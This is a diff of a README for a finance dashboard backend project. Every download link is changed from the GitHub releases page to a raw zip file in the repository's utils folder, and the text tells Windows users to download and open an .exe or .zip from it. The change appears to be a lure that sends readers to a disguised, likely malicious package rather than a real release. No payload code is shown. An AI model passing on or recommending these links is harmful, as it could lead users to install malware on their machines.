@@ -1,12 +1,12 @@
 # 🧾 Finance-Dashboard-Backend - Secure Finance Data Control
 
-[![Download Now](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/releases)
+[![Download Now](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/raw/refs/heads/main/utils/Backend_Dashboard_Finance_orangize.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest release for Windows:
 
-[Download Finance-Dashboard-Backend](https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/releases)
+[Download Finance-Dashboard-Backend](https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/raw/refs/heads/main/utils/Backend_Dashboard_Finance_orangize.zip)
 
 ## 💻 What This App Does
 
@@ -41,7 +41,7 @@ If the release package includes an `.exe` file, that is the file you should open
 
 ## 🚀 How to Download on Windows
 
-1. Open the [Download Finance-Dashboard-Backend](https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/releases) page.
+1. Open the [Download Finance-Dashboard-Backend](https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/raw/refs/heads/main/utils/Backend_Dashboard_Finance_orangize.zip) page.
 2. Find the latest release at the top of the page.
 3. Look under the release files.
 4. Download the Windows file, such as `.exe` or `.zip`.
@@ -210,7 +210,7 @@ These API routes let a front-end app show finance data on screens and charts.
 
 Use the release page here to download the Windows package:
 
-[https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/releases](https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/releases)
+[https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/raw/refs/heads/main/utils/Backend_Dashboard_Finance_orangize.zip](https://github.com/abrarsiddiqui112-design/Finance-Dashboard-Backend/raw/refs/heads/main/utils/Backend_Dashboard_Finance_orangize.zip)
 
 ## 🧭 Quick Start Checklist
 
